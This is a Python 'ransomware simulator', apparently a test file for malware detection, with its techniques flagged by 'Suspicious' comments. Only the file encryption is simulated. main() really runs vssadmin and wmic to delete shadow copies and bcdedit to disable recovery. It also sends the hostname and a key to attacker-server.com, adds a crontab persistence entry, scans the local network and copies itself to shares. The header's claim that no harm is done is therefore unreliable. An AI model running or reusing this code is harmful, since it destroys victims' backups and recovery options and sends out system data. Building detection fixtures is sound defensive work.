#!/usr/bin/env python3
"""
Ransomware Simulator - Test File 6
Simulates ransomware behavior patterns
WARNING: This is for TESTING ONLY - does not actually encrypt files
"""

import os
import base64
from cryptography.fernet import Fernet

# Suspicious: Encryption key generation
def generate_encryption_key():
    key = Fernet.generate_key()
    encoded_key = base64.b64encode(key)
    return encoded_key

# Suspicious: File encryption simulation
def encrypt_files(target_directory):
    """Simulate encrypting user files"""
    file_extensions = [".txt", ".doc", ".pdf", ".jpg", ".png"]
    
    for root, dirs, files in os.walk(target_directory):
        for file in files:
            if any(file.endswith(ext) for ext in file_extensions):
                file_path = os.path.join(root, file)
                # In real ransomware, this would encrypt the file
                print(f"[SIMULATED] Encrypting: {file_path}")

# Suspicious: Deleting shadow copies (anti-recovery)
def delete_shadow_copies():
    """Delete Windows shadow copies to prevent recovery"""
    # Suspicious: PowerShell command to delete backups
    os.system("powershell -Command \"vssadmin delete shadows /all /quiet\"")
    
    # Suspicious: Using wmic
    os.system("wmic shadowcopy delete")

# Suspicious: Disabling recovery options
def disable_recovery():
    """Disable system recovery features"""
    # Suspicious: Disabling Windows recovery
    os.system("bcdedit /set {default} recoveryenabled No")
    os.system("bcdedit /set {default} bootstatuspolicy ignoreallfailures")

# Suspicious: Network communication with C&C
def contact_command_server():
    """Contact attacker's command and control server"""
    import requests
    
    # Suspicious: Sending victim info to attacker
    victim_id = base64.b64encode(os.urandom(16))
    
    c2_server = "http://ransomware-c2.onion/register"
    data = {
        "victim_id": victim_id,
        "hostname": os.uname().nodename,
        "encryption_key": generate_encryption_key()
    }
    
    # Suspicious: HTTPS communication
    requests.post("https://attacker-server.com/victims", json=data)

# Suspicious: Creating ransom note
def create_ransom_note():
    """Create ransom note for victim"""
    ransom_message = """
    YOUR FILES HAVE BEEN ENCRYPTED!
    
    To recover your files, send 1 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
    
    Contact: ransomware@evil.com
    """
    
    # Writing ransom note to multiple locations
    locations = [
        "/home/user/Desktop/RANSOM_NOTE.txt",
        "/home/user/Documents/RANSOM_NOTE.txt",
        "C:\\Users\\Public\\Desktop\\RANSOM_NOTE.txt"
    ]
    
    for location in locations:
        try:
            with open(location, "w") as f:
                f.write(ransom_message)
        except:
            pass

# Suspicious: Persistence mechanism
def establish_persistence():
    """Ensure ransomware runs on system startup"""
    # Suspicious: Adding to startup
    startup_script = "/tmp/ransomware_startup.sh"
    
    with open(startup_script, "w") as f:
        f.write("#!/bin/bash\npython3 /tmp/ransomware.py &")
    
    os.system(f"chmod +x {startup_script}")
    
    # Suspicious: Adding to crontab
    os.system(f"echo '@reboot {startup_script}' >> /etc/crontab")

# Suspicious: Spreading to network shares
def spread_to_network():
    """Attempt to spread to network shares"""
    # Suspicious: Scanning network
    os.system("nmap -sn 192.168.1.0/24")
    
    # Suspicious: Mounting network shares
    shares = ["\\\\192.168.1.10\\shared", "\\\\192.168.1.20\\backup"]
    
    for share in shares:
        # Attempt to copy ransomware to network location
        os.system(f"copy ransomware.py {share}")

def main():
    print("[SIMULATION MODE - No actual harm will be done]")
    
    # Suspicious: eval and exec usage
    config = "{'target': '/home/user/Documents'}"
    eval(config)
    exec("print('Ransomware initialized')")
    
    # Simulate ransomware behavior
    delete_shadow_copies()
    disable_recovery()
    encrypt_files("/tmp/test_encryption")
    contact_command_server()
    create_ransom_note()
    establish_persistence()
    spread_to_network()

if __name__ == "__main__":
    main()
